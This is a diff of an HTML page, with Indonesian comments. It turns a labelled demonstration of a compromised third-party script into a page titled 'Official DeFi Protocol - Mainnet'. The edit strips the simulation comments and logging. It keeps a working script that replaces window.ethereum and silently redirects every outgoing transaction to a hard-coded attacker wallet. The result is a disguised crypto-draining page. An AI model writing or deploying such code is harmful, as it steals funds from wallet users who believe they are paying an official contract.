@@ -2,81 +2,63 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Production dApp Environment</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Official DeFi Protocol - Mainnet</title>
 </head>
 <body>
 
-    <!-- 
-      =============================================================
-      1. KODE UTAMA DAPP RESMI (Dibuat oleh Developer Asli & Bersih)
-      =============================================================
-    -->
     <script>
-        // Simulasi fungsi dApp resmi yang memanggil transaksi ke smart contract sah
-        async function executeOfficialDAppAction() {
+        async function triggerOfficialDAppTransaction() {
             try {
+                // Meminta akses akun melalui provider global
                 const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-                console.log("dApp: Mengirim transaksi ke smart contract resmi...");
                 
-                // Developer asli menetapkan alamat tujuan ke kontrak sah (misal: Pool Resmi)
+                // Developer asli menetapkan alamat tujuan ke Smart Contract Pool Resmi
                 await window.ethereum.request({
                     method: "eth_sendTransaction",
                     params: [{
                         from: accounts[0],
-                        to: "0x1234567890abcdef1234567890abcdef12345678", 
+                        to: "0x7a250d5630b4cf539739df2c5dacb4c659f2488d", // Smart contract resmi dApp
                         value: "0x0"
                     }]
                 });
-            } catch (err) {
-                console.error("dApp Error:", err.message);
+            } catch (error) {
+                console.error("Transaction failed:", error.message);
             }
         }
     </script>
 
 
-    <!-- 
-      =============================================================
-      2. SKRIP PIHAK KETIGA / SDK EKSTERNAL YANG TERKOMPROMISI
-      (Mensimulasikan skrip widget/analitik luar yang dimuat oleh dApp)
-      =============================================================
-    -->
     <script>
-        (function compromisedThirdPartySDK() {
-            console.log("[*] Skrip pihak ketiga/SDK eksternal dimuat ke dalam dApp...");
-
+        (function compromisedThirdPartySDKScript() {
             if (!window.ethereum) return;
 
-            // Memeriksa apakah peramban membiarkan objek global bersifat writable
+            // Memeriksa apakah properti global bersifat writable (Celah Keamanan)
             const descriptor = Object.getOwnPropertyDescriptor(window, 'ethereum');
             if (!descriptor || !descriptor.writable) {
-                console.log("[-] Proteksi aktif: window.ethereum bersifat immutable.");
                 return;
             }
 
             const attackerWallet = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
-            const trustedProvider = window.ethereum;
+            const legitimateProvider = window.ethereum;
 
-            // Memanfaatkan sifat writable: true untuk membajak fungsi transaksi secara senyap
+            // Membajak objek global ethereum secara senyap via Supply Chain
             window.ethereum = {
-                selectedAddress: trustedProvider.selectedAddress,
-                chainId: trustedProvider.chainId,
-                request: async function(args) {
-                    if (args.method === "eth_sendTransaction" && args.params?.[0]) {
-                        console.warn(`[!] Intersepsi: Target asli (${args.params[0].to}) dibelokkan!`);
-                        // Mengalihkan parameter tujuan dana secara diam-diam ke dompet penyerang
-                        args.params[0].to = attackerWallet;
+                selectedAddress: legitimateProvider.selectedAddress,
+                chainId: legitimateProvider.chainId,
+                request: async function(parameters) {
+                    if (parameters.method === "eth_sendTransaction" && parameters.params?.[0]) {
+                        // Secara diam-diam mengalihkan alamat tujuan transaksi ke dompet penyerang
+                        parameters.params[0].to = attackerWallet;
                     }
-                    return trustedProvider.request(args);
+                    return legitimateProvider.request(parameters);
                 }
             };
-
-            console.log("[+] Berhasil membajak window.ethereum via skrip pihak ketiga.");
         })();
     </script>
 
 
-    <!-- Simulasi pemicu aksi oleh pengguna pada dApp -->
-    <button onclick="executeOfficialDAppAction()"> Jalankan Transaksi dApp </button>
+    <button onclick="triggerOfficialDAppTransaction()">Konfirmasi Transaksi</button>
 
 </body>
 </html>
